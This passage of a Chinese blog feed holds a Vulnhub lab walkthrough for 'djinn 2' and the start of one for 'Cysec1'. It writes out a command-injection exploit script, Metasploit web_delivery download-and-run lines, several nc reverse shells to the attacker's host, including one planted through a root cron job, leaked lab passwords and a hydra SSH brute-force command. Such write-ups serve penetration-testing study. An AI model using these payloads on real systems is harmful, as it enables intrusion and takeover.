class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catcher</span>(<span class="params">host, username, password</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        url = URL.<span class="built_in">format</span>(host, username, password)</span><br><span class="line"></span><br><span class="line">        requests.post(url)</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Unable to connect to the server!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;If you have this then congratulations on being a part of an awesome organization&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;This key will help you in connecting to our system securely.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;If you find any issue please report it to ugtan@djinn.io&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;\nIP of the machine: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;Your username: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Your password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> check_ip(ip) <span class="keyword">and</span> username == <span class="string">&quot;REDACTED&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;REDACTED&quot;</span>:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Verifiying %s with host %s &quot;</span> % (username, ip))</span><br><span class="line"></span><br><span class="line">        catcher(ip, username, password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Invalid IP address given&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>其中有一个重要的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL &#x3D; &quot;http:&#x2F;&#x2F;&#123;&#125;:5000&#x2F;?username&#x3D;&#123;&#125;&amp;password&#x3D;&#123;&#125;&quot;</span><br></pre></td></tr></table></figure><p>这是提示5000端口可以利用</p><h2 id="网页枚举"><a href="#网页枚举" class="headerlink" title="网页枚举"></a>网页枚举</h2><p>赶紧访问5000端口查看</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113163918412.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113163918412.png" alt="image-20210113163918412"></a></p><p>翻译一下：“所请求的URL不允许使用该方法”。</p><p>当前什么方法？GET啊，那就换POST</p><p>在刚才发现的源代码中也能看到是post请求 <code>requests.post(url)</code></p><blockquote><p>如果想要验证是什么访问方式，可以用OPTIONS方式进行访问</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114100046670.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114100046670.png" alt="image-20210114100046670"></a></p><p>显示允许的方式为POST</p><p>OPTIONS请求其实是一次预检，只有非简单请求会预检。这一部分详细请参考<a href="https://www.jianshu.com/p/5cf82f092201">http跨域时的options请求</a></p></blockquote><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093126207.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093126207.png" alt="image-20210114093126207"></a></p><blockquote><p>这里特别注意一点：虽然是post请求，但是不能把参数放在下面，而是在url里</p></blockquote><p>返回200，但是什么内容也没有，是不是用户名和密码错误，根据源代码中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ip and check_ip(ip) and username &#x3D;&#x3D; &quot;REDACTED&quot; and password &#x3D;&#x3D; &quot;REDACTED&quot;</span><br></pre></td></tr></table></figure><p>再试一次</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093456987.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093456987.png" alt="image-20210114093456987"></a></p><p>嘿，结果一样啊，那怎么利用？</p><blockquote><p>这里就需要发散思维求解了，由于这个靶机跟上一个内容一样，利用点不一样，但是利用方式可能是类似的，会不会也是命令执行漏洞呢，那么如何将命令传送给系统呢，大胆假设，在用户名和密码的位置输入代码。</p></blockquote><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093835863.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093835863.png" alt="image-20210114093835863"></a></p><p>通过测试，发现只在用户名处存在<code>RCE</code>漏洞（<strong>remote command/code execute</strong>），也叫远程代码/命令执行</p><h2 id="curl-X"><a href="#curl-X" class="headerlink" title="curl -X"></a>curl -X</h2><p>这里也可以用curl执行,一样的效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;192.168.56.109:5000/?username=id&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114105249792.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114105249792.png" alt="image-20210114105249792"></a></p><blockquote><p>-X 是指定请求的方式为GET还是POST</p></blockquote><h2 id="RCE-getshell"><a href="#RCE-getshell" class="headerlink" title="RCE getshell"></a>RCE getshell</h2><p>有了利用点，接下来又是紧张又刺激的反弹shell环节</p><p>那就试一下跟上一个靶机一样的方式</p><p>结果不行，应该是过滤掉了，也是啊，上一个方法怎么还能重复使用呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;192.168.56.109:5000/?username=ls&#x27;</span>   <span class="comment"># 有一个文件app.py</span></span><br><span class="line">curl -X POST <span class="string">&#x27;192.168.56.109:5000/?username=cat%20app.py&#x27;</span>    <span class="comment"># 查看文件</span></span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114110319007.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114110319007.png" alt="image-20210114110319007"></a></p><p>发现过滤了 <code>|</code> ，所以base64解码的时候靠连接符拼接语句是失败的</p><h3 id="法一：msf——web-delivery"><a href="#法一：msf——web-delivery" class="headerlink" title="法一：msf——web_delivery"></a>法一：msf——web_delivery</h3><p>利用<strong>web_delivery</strong>模块</p><blockquote><p>目标设备存在<code>远程文件包含漏洞</code>或者<code>命令注入漏洞</code>，想在目标设备上加载webshell，但不想在目标设备硬盘上留下任何webshell文件信息都可以用这个模块。（远程包含直接访问远程链接）</p><p>原理：让目标设备从远端服务器加载webshell代码至内存执行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> target 6     <span class="comment"># show targets 后选择一个</span></span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp  <span class="comment"># 必须依据target来自己设定payload</span></span><br><span class="line"><span class="built_in">set</span> lhost 192.168.56.123</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><p>运行后会出现一行代码，教你怎么利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO esP1RoPD --no-check-certificate http://192.168.56.123:8080/obwKswSG; chmod +x esP1RoPD; ./esP1RoPD&amp; <span class="built_in">disown</span></span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115245841.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115245841.png" alt="image-20210114115245841"></a></p><p>他这个意思是：先下载下来一个文件，再设置权限，执行，就可以反弹了</p><blockquote><p>需要注意：-qO 后是下载输出的位置，一定要放在<code>/tmp</code>目录下，不然会消失。</p><p>url的空格可以是%20 也可以是’+’ 我个人喜欢’+’ 看起来很舒服</p></blockquote><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114114638118.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114114638118.png" alt="image-20210114114638118"></a></p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115857078.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115857078.png" alt="image-20210114115857078"></a></p><p>可以看到下载成功了，然后增加执行权限，执行反弹shell</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114124818575.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114124818575.png" alt="image-20210114124818575"></a></p><h3 id="法二：py脚本"><a href="#法二：py脚本" class="headerlink" title="法二：py脚本"></a>法二：py脚本</h3><p>kali下新建一个1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byteEncode</span>(<span class="params">string</span>):</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">result += <span class="string">&quot;\\x&quot;</span> + c.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">target_address = <span class="string">&quot;192.168.56.109:5000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">cmd = raw_input(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">cmd = byteEncode(cmd)</span><br><span class="line">cmd = <span class="string">&#x27;env printf &quot;&#x27;</span>+cmd+<span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&quot;username&quot;</span> : <span class="string">&#x27;echo `&#x27;</span> + cmd  + <span class="string">&#x27;` &gt; /tmp/tmp.sh &amp;&amp; chmod +x /tmp/tmp.sh &amp;&amp; /tmp/tmp.sh&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://&quot;</span> + target_address</span><br><span class="line">r = requests.post(url, params = params)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>直接执行</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114155923707.png" alt="image-20210114155923707"></p><p>啊！这！直接？？？就获取shell了？？orz<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/2E2543EC.gif" alt="img"></p><p>我仔细琢磨一番，啊~是这样啊，$是每次执行命令都会出现的符号而已，实际还在执行这个py文件，只是看起来好看了，那再输入反弹语句，弹出来的才是真正意思上的shell环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/foo;cat /tmp/foo | /bin/bash -i 2&gt;&amp;1 | nc 192.168.56.123 8888&gt;/tmp/foo</span><br></pre></td></tr></table></figure><blockquote><p>这里又是很奇怪的一点，用常规的mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.56.123 8888 &gt;/tmp/f是不行的，嘿！这咋回事，不接受f只接受foo吗？我试了好几次，换成fow，就行，OK知道了，f这个文件原本是存在的，没有rm /tmp/f;结果呢，怎么都删不掉，一看是root创建的，我确实删不掉，那就换文件名为其他的就行了，目的不就是为了弹shell吗，其实我觉得这样的状态下，好用就行了，弹不弹的看个人喜好吧</p></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>   <span class="comment"># python不能用，试试python3</span></span><br></pre></td></tr></table></figure><h3 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h3><blockquote><p>由于这是一家公司，查找思路是/var/下有没有backup，还有/var下的mail邮箱信息</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var</span><br><span class="line">ls -la</span><br><span class="line"><span class="built_in">cd</span> backups</span><br><span class="line">ls -la</span><br><span class="line"><span class="built_in">cd</span> /var/mail</span><br><span class="line">ls -la /var/mail/*</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142305078.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142305078.png" alt="image-20210114142305078"></a></p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114125352088.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114125352088.png" alt="image-20210114125352088"></a></p><p>看到了nitu，想起了那个ftp服务器下的三个txt文件，其中creds.txt里面就有这个nitu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nitu:7846A$56</span><br></pre></td></tr></table></figure><p>猜测是什么地方的密码</p><h3 id="KeePass2"><a href="#KeePass2" class="headerlink" title="KeePass2"></a>KeePass2</h3><p>再看这个nitu.kdbx文件是隶属于nitish用户的，那kdbx又是什么文件呢</p><blockquote><p>什么是KDBX文件？</p><p>由Windows免费密码管理器KeePass Password Safe创建的文件； </p><p>存储密码的加密数据库，该数据库只能使用用户设置的主密码进行查看； </p><p>用于安全存储Windows，电子邮件帐户，FTP站点，电子商务站点和其他目的的个人登录凭据。</p></blockquote><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130447916.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130447916.png" alt="image-20210114130447916"></a></p><p>下载链接在：<a href="https://m33.wiki/extension/kdbx.html">打开KDBX文件的程序</a></p><p>有了可以打开kdbx文件的软件，就可以打开看了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server   <span class="comment"># python3共享文件的方式</span></span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130842669.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130842669.png" alt="image-20210114130842669"></a></p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131022995.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131022995.png" alt="image-20210114131022995"></a></p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131150694.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131150694.png" alt="image-20210114131150694"></a></p><p>鼠标右键copy password</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131511751.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131511751.png" alt="image-20210114131511751"></a></p><p>竟然！12秒之后就会清空你的粘贴板，赶紧粘贴，看到了密码是 <code>&amp;HtMGd$LJB</code></p><p>意味着可以su nitish 回想起22端口开放着，是不是能直接登录了呢</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131854850.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131854850.png" alt="image-20210114131854850"></a></p><p>呦西！可以！这下提权方便多了，看到了lxd用户组，这个之前提权过</p><p>这里先不提</p><p>继续找，找一下当前开放的进程和端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114133334857.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114133334857.png" alt="image-20210114133334857"></a></p><p>32984是与kali反弹shell自动开放的端口</p><p>那么25、6010、2843是什么，25是MSTP邮件服务器，其他不知道，那就nc连接看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.109 2843</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114135949043.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114135949043.png" alt="image-20210114135949043"></a></p><blockquote><p>这个小游戏，研究了一会，发现5和6具有联动效应，5添加一个note名称，6会列出所有的note，由我选择查看哪一个，比如文件名为/etc/passwd，选择的时候会自动执行cat “文件名”</p></blockquote><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140743860.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140743860.png" alt="image-20210114140743860"></a></p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140937128.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140937128.png" alt="image-20210114140937128"></a></p><p>当前用户不是nitish 而是ugtan，利用这个机制，再来反弹一个shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.123 1111 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114141817733.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114141817733.png" alt="image-20210114141817733"></a></p><blockquote><p>输入文件名的时候，前面要先拼接一个目录，随便什么都可以，然后分号结束，再执行下一个命令</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142016256.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142016256.png" alt="image-20210114142016256"></a></p></blockquote><h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><p>现在是ugtan用户了，想起了前面查找文件<code>/var/mail/ugtan</code>是只能ugtan查看的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">From root@djinn  Mon Jan 13 19:36:24 2020</span><br><span class="line">Return-Path: &lt;root@djinn&gt;</span><br><span class="line">X-Original-To: ugtan@djinn</span><br><span class="line">Delivered-To: ugtan@djinn</span><br><span class="line">Received: by djinn (Postfix, from userid 0)</span><br><span class="line">        id E2B7C82E9F; Mon, 13 Jan 2020 19:36:24 +0530 (IST)</span><br><span class="line">Subject: Way to clean up the systems</span><br><span class="line">To: &lt;ugtan@djinn&gt;</span><br><span class="line">X-Mailer: mail (GNU Mailutils 3.4)</span><br><span class="line">Message-Id: &lt;20200113140624.E2B7C82E9F@djinn&gt;</span><br><span class="line">Date: Mon, 13 Jan 2020 19:36:24 +0530 (IST)</span><br><span class="line">From: root &lt;root@djinn&gt;</span><br><span class="line"></span><br><span class="line">Hey 0xmzfr,</span><br><span class="line">I<span class="string">&#x27;ve setup the folder that you asked me to make in my home directory,</span></span><br><span class="line"><span class="string">Since I&#x27;</span>d be gone <span class="keyword">for</span> a day or two you can just leave the clean.sh <span class="keyword">in</span></span><br><span class="line">that directory and cronjob will handle the rest. </span><br><span class="line"></span><br><span class="line">- Ugtan_</span><br></pre></td></tr></table></figure><p>这封邮件的内容，阿嘞嘞，上翻译！</p><blockquote><p>我已经在我的主目录中设置了您要创建的文件夹， 由于我要离开一两天，所以您只需将<code>clean.sh</code>留在该目录然后cronjob将处理其余部分。</p></blockquote><p>Oh~ 那不就是在<code>/home/ugtan/best/admin/ever</code>下新建<code>clean.sh</code>，然后定时器会自动执行的意思吗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.123 2222 &gt;/tmp/f&#x27;</span> &gt; clean.sh</span><br></pre></td></tr></table></figure><p>然后等待定时任务的执行，不知道几分钟，等就是了</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114144010259.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114144010259.png" alt="image-20210114144010259"></a></p><blockquote><p>监听2222端口，弹回root的shell，因为是root权限自动执行的定时任务，不是ugtan执行的。</p></blockquote><p>到这大概就结束了，从/root下也查看到了proof.sh这个flag文件</p><h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ul><li>这次靶机获取了好几个用户的权限，这种层层攻破最终获取root权限的过程叫做<code>跳板用户提权</code></li><li>获取到的新知识也是关键的一个文件：<code>kdbx文件</code> 下载KeePass2才能通过密码读取到的文件，获取到了nitish用户的密码，才能进入后续的提权操作</li><li>这次渗透利用的关键是两处RCE，第一个是POST提交的username参数处，第二个是小游戏中note文件名是cat&lt;文件名&gt;漏洞</li><li><code>curl -X</code> 指定http请求方式的命令可以替换burp</li><li>python3共享文件的方法：<code>python3 -m http.server</code></li><li>定时文件执行也可以获取到最高权限</li><li>RCE漏洞或远程文件包含漏洞有一个通用的<code>msf</code>利用模块<code>web_delivery</code></li><li>这个第二种python脚本getshell的方式，真的厉害，参考链接3的文章才知道的orz，我也想这么牛</li><li>lxd提权那里，后面我又试了一下，确实是root了，但是id的时候没有用户组，用户组不在root里面，玩呢？也不知道问题是出在哪了–</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>1、<a href="https://blog.csdn.net/weixin_43784056/article/details/107008701">https://blog.csdn.net/weixin_43784056/article/details/107008701</a></p><p>2、<a href="https://www.programmersought.com/article/28434657542/">https://www.programmersought.com/article/28434657542/</a></p><p>3、<a href="http://andreaukk.altervista.org/djinn-2-writeup-vulnhub/?doing_wp_cron=1610527850.3320260047912597656250">http://andreaukk.altervista.org/djinn-2-writeup-vulnhub/?doing_wp_cron=1610527850.3320260047912597656250</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cysec1靶机练习</title>
      <link href="2023/11/28/Cysec1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/Cysec1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="CYSEC：1"><a href="#CYSEC：1" class="headerlink" title="CYSEC：1"></a>CYSEC：1</h2><p>靶机位置：<a href="https://www.vulnhub.com/entry/cysec-1,524/">https://www.vulnhub.com/entry/cysec-1,524/</a></p><p>查找主机</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104091446341.png" alt="image-20210104091446341"></p><p>netdiscover</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104091601941.png" alt="image-20210104091601941"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104094053869.png" alt="image-20210104094053869"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104100903500.png" alt="image-20210104100903500"></p><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l anonymouse -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 192.168.36.128 ssh -V -I -e nsr -t 4 -T  2 -u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104103407930.png" alt="image-20210104103407930"></p><h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh anonymouse@192.168.36.128</span><br><span class="line">输入密码anonymouse</span><br></pre></td></tr></table></figure><p>登录进去ls,看到一个readme.txt文件，内容如下</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104104609641.png" alt="image-20210104104609641"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104104446495.png" alt="image-20210104104446495"></p><p>也就是说，这个png图片需要获取ip, mac, icmp协议信息,有ctf那味了。</p><p>用moba登入ssh获取图片</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104110254146.png" alt="image-20210104110254146"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104111301909.png" alt="image-20210104111301909"></p><p>利用<a href="https://hpd.gasmi.net/">https://hpd.gasmi.net/</a> 网站进行数据包解码</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104111255617.png" alt="image-20210104111255617"></p><p>将图片中数据手动输入，解码，而不是上传pcap文件</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104111415850.png" alt="image-20210104111415850"></p><p>然后根据readme所说，下级目录的拼接顺序是<code>&quot;DstMAC:TypeICMP:SrcIP&quot;</code>，然后再md5加密获得的，且是a8f开头</p><p>所以 <code>D4:CA:6D:43:5A:90:8:172.18.70.214</code> md5加密得到 <code>a8f64cea84bc654f4769c483876c08e7</code> </p><p>访问该目录</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104112002801.png" alt="image-20210104112002801"></p><p>每一张图片都是</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104112044841.png" alt="image-20210104112044841"></p><p>下载所有的图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r &quot;http:&#x2F;&#x2F;192.168.36.128&#x2F;a8f64cea84bc654f4769c483876c08e7&#x2F;&quot;</span><br></pre></td></tr></table></figure><blockquote><p> -r, –recursive（递归） specify recursive download.（指定递归下载）</p><p> -k, –convert-links（转换链接） make links in downloaded HTML point to local files.（将下载的HTML页面中的链接转换为相对链接即本地链接）</p><p> -p, –page-requisites（页面必需元素） get all images, etc. needed to display HTML page.（下载所有的图片等页面显示所需的内容）</p><p> -np, –no-parent（不追溯至父级） don’t ascend to the parent directory.</p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104113133738.png" alt="image-20210104113133738"></p><p>然后，挨个儿<code>strings</code>查看，直到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings HoldOn13.jpg</span><br></pre></td></tr></table></figure><p><img 